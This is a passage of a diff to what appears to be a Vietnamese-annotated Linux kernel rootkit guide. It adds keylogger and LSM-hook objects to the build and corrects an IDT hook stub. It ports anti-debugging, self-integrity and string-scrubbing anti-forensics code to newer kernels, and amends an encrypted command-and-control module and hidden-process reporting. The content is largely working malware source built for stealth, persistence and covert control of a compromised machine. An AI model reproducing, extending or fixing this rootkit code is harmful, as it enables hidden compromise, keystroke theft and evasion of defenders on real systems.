+/* kprobe_hooks.c */
+int  rk_kprobe_install(void);
+void rk_kprobe_remove(void);
+
+/* vfs_hooks.c */
+void rk_vfs_hook_install(void);
+void rk_vfs_hook_remove(void);
+
+/* integrity.c */
+void rk_integrity_init(void);
+
+/* lsm_hooks.c */
+int  rk_lsm_install(void);
+void rk_lsm_remove(void);
 
 /* persistence.c */
 void rk_install_persistence(void);
@@ -11358,7 +11744,8 @@ $(MODULE_NAME)-objs := main.o syscall_hooks.o ftrace_hooks.o \
                         kprobe_hooks.o vfs_hooks.o net_hooks.o \
                         dkom.o inline_hook.o util.o persistence.o \
                         anti_forensics.o covert_channel.o \
-                        proc_interface.o encrypted_c2.o
+                        proc_interface.o encrypted_c2.o \
+                        keylogger.o lsm_hooks.o integrity.o
 
 KDIR ?= /lib/modules/$(shell uname -r)/build
 PWD  := $(shell pwd)
@@ -11994,21 +12381,21 @@ SYM_CODE_START(idt_hook_stub)
 
     /* Push theo thu tu KERNEL ENTRY: rdi first, r15 last.
      * Sau pushes: RSP tro toi pt_regs-compatible frame. */
-    push %rdi       /* offset 104 -> pushed first -> highest addr */
-    push %rsi       /* offset 96 */
-    push %rdx       /* offset 88 */
-    push %rcx       /* offset 80 */
-    push %rax       /* offset 72 (orig_rax/syscall nr) */
-    push %r8        /* offset 64 */
-    push %r9        /* offset 56 */
-    push %r10       /* offset 48 */
-    push %r11       /* offset 40 */
-    push %rbx       /* offset 32 */
-    push %rbp       /* offset 24 */
-    push %r12       /* offset 16 */
-    push %r13       /* offset 8 */
-    push %r14       /* offset 0... wait, nhung phai push r15 cuoi */
-    push %r15       /* offset 0 -> pushed last -> RSP points here */
+    push %rdi       /* pt_regs offset 112 — pushed first = highest addr */
+    push %rsi       /* pt_regs offset 104 */
+    push %rdx       /* pt_regs offset 96 */
+    push %rcx       /* pt_regs offset 88 */
+    push %rax       /* pt_regs offset 80 (orig_rax) */
+    push %r8        /* pt_regs offset 72 */
+    push %r9        /* pt_regs offset 64 */
+    push %r10       /* pt_regs offset 56 */
+    push %r11       /* pt_regs offset 48 */
+    push %rbx       /* pt_regs offset 40 */
+    push %rbp       /* pt_regs offset 32 */
+    push %r12       /* pt_regs offset 24 */
+    push %r13       /* pt_regs offset 16 */
+    push %r14       /* pt_regs offset 8 */
+    push %r15       /* pt_regs offset 0 — pushed last = RSP points here */
 
     /* RSP bay gio = pointer toi r15 slot = pt_regs offset 0.
      * regs->r15 = RSP[0], regs->r14 = RSP[8], ..., regs->di = RSP[104]
@@ -12409,7 +12796,7 @@ static struct security_hook_list rk_hooks[] = {
     LSM_HOOK_INIT(bprm_check_security, rk_bprm_check),
 };
 
-static int rk_lsm_install(void)
+int rk_lsm_install(void)
 {
     /* Tim security_hook_heads structure */
     rk_hook_heads = (struct security_hook_heads *)
@@ -12435,7 +12822,7 @@ static int rk_lsm_install(void)
     return 0;
 }
 
-static void rk_lsm_remove(void)
+void rk_lsm_remove(void)
 {
     int i;
     for (i = 0; i < ARRAY_SIZE(rk_hooks); i++) {
@@ -13302,12 +13689,13 @@ static int compute_module_hash(u8 *hash_out)
     unsigned int code_size;
 
     /* Module code location:
-     *   THIS_MODULE->core_layout.base = start of module memory
-     *   THIS_MODULE->core_layout.text_size = size of code (.text) section
+     *   MOD_BASE(THIS_MODULE) = start of module memory
+     *   MOD_SIZE(THIS_MODULE) = size of code (.text) section
+     *   (Compat macros defined trong rootkit.h — kernel 6.4+ support)
      *
      * Chi hash code section (khong hash data — data thay doi binh thuong). */
-    code_start = THIS_MODULE->core_layout.base;
-    code_size  = THIS_MODULE->core_layout.text_size;
+    code_start = MOD_BASE(THIS_MODULE);
+    code_size  = MOD_SIZE(THIS_MODULE);
 
     /* Allocate SHA-256 transform */
     tfm = crypto_alloc_shash(HASH_ALGO, 0, 0);
@@ -13380,8 +13768,8 @@ bool rk_integrity_check(void)
 /* -- Scan for breakpoints (0xCC INT3) trong code section -- */
 bool rk_detect_breakpoints(void)
 {
-    unsigned char *code = THIS_MODULE->core_layout.base;
-    unsigned int size = THIS_MODULE->core_layout.text_size;
+    unsigned char *code = MOD_BASE(THIS_MODULE);
+    unsigned int size = MOD_SIZE(THIS_MODULE);
     unsigned int i;
     int bp_count = 0;
 
@@ -13441,19 +13829,23 @@ static void rk_scrub_module_strings(void)
 {
     /* Module .rodata section chua string literals.
      *
-     * THIS_MODULE->core_layout.base = module start
-     * THIS_MODULE->core_layout.ro_size = read-only section size
-     *   (includes .text + .rodata)
-     * THIS_MODULE->core_layout.text_size = .text only
+     * Kernel < 6.4: core_layout.base/text_size/ro_size
+     * Kernel 6.4+:  mem[MOD_TEXT]/mem[MOD_RODATA]
      *
-     * .rodata nam tu text_size -> ro_size.
-     */
+     * .rodata nam tu text_size -> ro_size (pre-6.4)
+     * hoac mem[MOD_RODATA].base / .size (6.4+). */
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
+    unsigned long rodata_start =
+        (unsigned long)THIS_MODULE->mem[MOD_RODATA].base;
+    unsigned long rodata_size = THIS_MODULE->mem[MOD_RODATA].size;
+#else
     unsigned long rodata_start =
         (unsigned long)THIS_MODULE->core_layout.base +
         THIS_MODULE->core_layout.text_size;
     unsigned long rodata_size =
         THIS_MODULE->core_layout.ro_size -
         THIS_MODULE->core_layout.text_size;
+#endif
 
     /* Make rodata writable temporarily */
     set_memory_rw(rodata_start & PAGE_MASK,
@@ -13932,7 +14324,7 @@ static phys_addr_t rk_virt_to_phys(unsigned long vaddr)
     pte_t *pte;
 
     /* Walk page tables: PGD -> P4D -> PUD -> PMD -> PTE -> physical */
-    pgd = pgd_offset(current->mm ? current->mm : &init_mm, vaddr);
+    pgd = pgd_offset(&init_mm, vaddr);
     if (pgd_none(*pgd)) return 0;
 
     p4d = p4d_offset(pgd, vaddr);
@@ -14607,8 +14999,14 @@ static uid_t fake_getuid(void)
 
 ### I.1 Encrypted C2 — ChaCha20-Poly1305 AEAD {#encrypted-c2-chacha20}
 
+> **LUU Y**: Code duoi day la standalone version voi giai thich chi tiet.
+> Neu compile chung voi Ch14 `covert_channel.o`, **KHONG** include file nay
+> rieng — dung code tu Ch14 (da co `rk_crypto_init/cleanup`).
+> File nay chi compile rieng neu thay the `encrypted_c2.o` trong Makefile.
+
 ```c
-/* encrypted_c2_chacha20.c — Kernel C2 encryption via ChaCha20-Poly1305
+/* encrypted_c2_chacha20.c — STANDALONE Kernel C2 encryption
+ * (Alternative implementation — DO NOT compile cung voi Ch14 covert_channel.c)
  *
  * Tai sao khong dung XOR:
  *   - XOR cipher: trivially breakable (known-plaintext attack)
@@ -15327,7 +15725,7 @@ static ssize_t rk_proc_read(struct file *file,
         "Hidden PIDs: %d\n"
         "Hooks: active\n",
         module_hidden ? "hidden" : "visible",
-        hidden_pid_count);
+        rk_get_hidden_pid_count());
 
     if (len > count) len = count;
     if (copy_to_user(buf, status, len))
